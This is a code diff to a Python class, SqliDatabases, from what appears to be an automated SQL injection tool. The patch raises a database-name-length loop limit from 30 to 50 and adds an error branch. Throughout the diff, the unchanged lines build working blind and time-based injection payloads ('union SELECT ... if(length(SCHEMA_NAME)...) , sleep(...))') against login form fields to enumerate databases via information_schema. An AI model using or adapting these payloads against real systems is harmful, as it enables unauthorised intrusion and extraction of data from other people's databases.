@@ -95,8 +95,8 @@ class SqliDatabases(SqliTest):
                             databases_name_len = j
                             break
                         elif j == 50:
-                            logger.error("Database length > 100...")
-                            databases_name_len = 100
+                            logger.error("Database length > 50...")
+                            databases_name_len = 50
 
                     logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                     logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))
@@ -146,13 +146,16 @@ class SqliDatabases(SqliTest):
                     logger.debug("Start %dth database length sqli..." % (i + 1))
 
                     # 然后注databases_name 的 length
-                    for j in trange(30, desc="%dth Database length sqli..." % (i + 1), leave=False):
+                    for j in trange(50, desc="%dth Database length sqli..." % (i + 1), leave=False):
                         payload = "user=ddog' union  SELECT 1,if((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
                             i) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
 
                         if self.Data.GetTimeData(payload, self.time) == 0:
                             databases_name_len = j
                             break
+                        elif j == 50:
+                            logger.error("Database length > 50...")
+                            databases_name_len = 50
 
                     logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                     logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))
@@ -254,7 +257,7 @@ class SqliDatabases(SqliTest):
 
                     # 然后注databases_name 的 length
                     logger.debug("Start %dth database length sqli..." % (i + 1))
-                    for j in trange(30, desc="%dth Database length sqli..." % (i + 1), leave=False):
+                    for j in trange(50, desc="%dth Database length sqli..." % (i + 1), leave=False):
                         # payload = {
                         #     "user": "user1' && (select ((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
                         #         i) + ",1) > " + repr(j) + "))#", "passwd": "ddog123"}
@@ -265,6 +268,9 @@ class SqliDatabases(SqliTest):
                         if self.Data.PostBuildData(payload, self.len) == 0:
                             databases_name_len = j
                             break
+                        elif j == 50:
+                            logger.error("Database length > 50...")
+                            databases_name_len = 50
 
                     logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                     logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))
@@ -319,7 +325,7 @@ class SqliDatabases(SqliTest):
                     # 然后注databases_number 的length
 
                     logger.debug("Start %dth database length sqli..." % (i + 1))
-                    for j in trange(30, desc="%dth Database length sqli..." % (i + 1), leave=False):
+                    for j in trange(50, desc="%dth Database length sqli..." % (i + 1), leave=False):
                         payload = {
                             "user": "admi' union SELECT 1,if((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
                                 i) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
@@ -327,6 +333,9 @@ class SqliDatabases(SqliTest):
                         if self.Data.PostTimeData(payload, self.time) == 0:
                             databases_name_len = j
                             break
+                        elif j == 50:
+                            logger.error("Database length > 50...")
+                            databases_name_len = 50
 
                     logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                     logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))
